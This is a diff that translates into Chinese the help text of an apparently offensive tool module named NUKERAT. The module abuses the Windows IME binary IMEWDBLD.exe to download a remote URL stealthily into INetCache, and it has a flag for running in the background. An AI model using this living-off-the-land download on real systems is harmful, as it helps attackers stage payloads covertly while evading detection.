@@ -1,17 +1,17 @@
-ABOUT
+关于
     Microsoft IME dictionary build module. LOLBAS treats a URL
     as a dictionary source and saves the response into INetCache for
     unobtrusive download.
 
-USAGE:
+用法：
     C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
 
-EXAMPLES:
+示例：
     C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
 
-NUKERAT FLAGS:
-    -w <seconds>    Maximum wait time until timeout
-    -bg             Fork and run without waiting for output
+NUKERAT 选项：
+    -w <秒数>       等待超时的最大时间
+    -bg             后台运行，不等待输出
 
-    Example:
+    示例：
     C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
